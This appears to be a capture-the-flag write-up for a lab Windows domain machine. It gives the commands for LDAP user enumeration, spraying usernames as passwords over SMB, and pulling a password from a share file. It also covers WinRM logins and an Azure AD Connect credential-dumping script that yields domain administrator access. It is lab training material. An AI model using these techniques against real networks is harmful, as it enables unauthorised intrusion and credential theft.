Difficulty: Medium
### Information Gathering

IP Address: 10.129.232.88

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.

```
ldapsearch -x -H ldap://10.129.232.88 -b "DC=megabank,DC=local" | grep - i sama
```

After checking the LDAP Logs, there is a list of users that is returned.
```
<SNIP>
sAMAccountType: 268435456
sAMAccountName: Operations
sAMAccountType: 268435456
sAMAccountName: Trading
sAMAccountType: 268435456
sAMAccountName: HelpDesk
sAMAccountType: 268435456
sAMAccountName: Developers
sAMAccountType: 268435456
sAMAccountName: dgalanos
sAMAccountType: 805306368
sAMAccountName: roleary
sAMAccountType: 805306368
sAMAccountName: smorgan
sAMAccountType: 805306368
```

The usernames will be put into a userlist.
Those are the contents of the file `users.txt`
```
Guest
MONTEVERDE$
SABatchJobs
svc-ata
svc-bexec
svc-netapp
Reception
Operations
Trading
HelpDesk
Developers
dgalanos
roleary
smorgan
```

Check the credentials by their username.
```
netexec smb megabank.local -u users.txt -p users.txt --continue-on-success
```

`SABatchJobs:SABatchJobs` is a valid set of credentials.

The share can be examined.
```
smbclient //megabank.local/azure_uploads -U 'SABatchJobs%SABatchJobs'
```

It returns a few users and a file called `azure.xml` inside the folder `mhope`.

There is a user called `mhope`, according to the share.
It has been appended at the file `users.txt`.

```
do_connect: Connection to MONTEVERDE.MEGABANK.LOCAL failed (Error NT_STATUS_UNSUCCESSFUL)
```

An error is thrown, `/etc/hosts` will be updated with `monteverde.megabank.local` to the same IP address.

This is the credentials in the file.
`mhope:4n0therD4y@n0th3r$`

A WinRM session can be started.
```
evil-winrm -i megabank.local -u 'mhope' -p '4n0therD4y@n0th3r$'
```


User flag successfully obtained.
![[Screenshot 2026-07-26 at 17.24.32.png]]

# Root Flag
#### Privilege Escalation

After checking `C:\Program Files`, it is possible to see that there is Azure Connect services folders.

After inspecting them, there were no credentials.

After searching "Azure AD Connnect", there is an exploit about the stored password dumping from the database.

The script can be downloaded here.
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor

```
upload decrypt.ps1
.\decrypt.ps1
```

After uploading and decrypting it on the machine.
```
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Those credentials are valid.
```
evil-winrm -i megabank.local -u 'administrator' -p 'd0m@in4dminyeah!'
```

Login is successful from WinRM.

The root flag has been obtained.
![[Screenshot 2026-07-26 at 18.56.20.png]]